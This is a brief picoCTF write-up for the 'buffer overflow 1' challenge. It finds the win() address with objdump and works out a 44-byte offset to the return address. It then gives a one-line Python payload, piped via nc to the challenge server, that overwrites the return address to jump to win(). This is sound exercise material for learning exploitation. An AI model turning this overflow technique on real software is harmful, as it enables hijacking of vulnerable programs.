# buffer overflow 1

**objdump** tells addr of win() is `0x080491f6`

Trying different length of inputs more than 32 bytes helped to pinpoint where the return address (which is printed by the program) starts

```shell
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\xf6\x91\x04\x08\n")' | nc saturn.picoctf.net 58700
```
